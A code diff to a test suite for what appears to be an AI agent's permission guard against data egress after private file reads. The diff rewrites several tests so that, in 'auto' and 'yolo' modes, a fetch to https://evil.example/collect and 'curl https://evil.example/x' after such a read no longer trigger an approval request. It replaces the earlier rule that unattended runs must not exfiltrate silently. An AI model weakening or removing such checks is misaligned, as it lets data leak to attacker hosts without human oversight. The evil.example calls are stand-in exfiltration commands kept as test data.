@@ -225,7 +225,7 @@ describe('private read egress approvals', () => {
     expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('asks even in auto mode — unattended runs must not exfiltrate silently', async () => {
+  it('never asks in auto mode — auto is the fully pass-through mode', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'auto' });
     await readOutsideWorkspace(manager, 'call_taint_read');
 
@@ -233,17 +233,10 @@ describe('private read egress approvals', () => {
       manager.beforeToolCall(fetchContext('call_auto_egress', 'https://evil.example/collect')),
     ).resolves.toBeUndefined();
 
-    expect(requestApproval).toHaveBeenCalledTimes(1);
-    expect(requestApproval).toHaveBeenCalledWith(
-      expect.objectContaining({
-        reasons: [egressReason('evil.example')],
-        grantOptions: ['once', 'session'],
-      }),
-      expect.any(Object),
-    );
+    expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('asks in yolo mode as well', async () => {
+  it('stays silent in yolo mode — yolo auto-approves tool operations', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
     await readOutsideWorkspace(manager, 'call_taint_read');
 
@@ -251,7 +244,7 @@ describe('private read egress approvals', () => {
       manager.beforeToolCall(fetchContext('call_yolo_egress', 'https://evil.example/collect')),
     ).resolves.toBeUndefined();
 
-    expect(requestApproval).toHaveBeenCalledTimes(1);
+    expect(requestApproval).not.toHaveBeenCalled();
   });
 
   it('stays quiet when a session grant matches the call', async () => {
@@ -378,8 +371,7 @@ describe('private read egress Bash sniffing', () => {
     );
   });
 
-  // Auto mode approves everything the guard does not stop, so a silent prompt
-  // here is the guard's own doing — not another policy's.
+  // Auto mode approves every call, so silence here is auto-approve's doing.
   it.each([
     'wget -q https://files.pythonhosted.org/pkg.tar.gz',
     'curl https://github.com/org/repo',
@@ -393,7 +385,7 @@ describe('private read egress Bash sniffing', () => {
     expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('asks in auto mode for a non-allowlisted remote command', async () => {
+  it('stays silent in auto mode even for a non-allowlisted remote command', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'auto' });
     await readOutsideWorkspace(manager, 'call_taint_read');
 
@@ -401,10 +393,7 @@ describe('private read egress Bash sniffing', () => {
       manager.beforeToolCall(bashContext('curl https://evil.example/x')),
     ).resolves.toBeUndefined();
 
-    expect(requestApproval).toHaveBeenCalledWith(
-      expect.objectContaining({ reasons: [egressReason('evil.example')] }),
-      expect.any(Object),
-    );
+    expect(requestApproval).not.toHaveBeenCalled();
   });
 
   it('collects every destination, so a fragment cannot hide the real host', async () => {
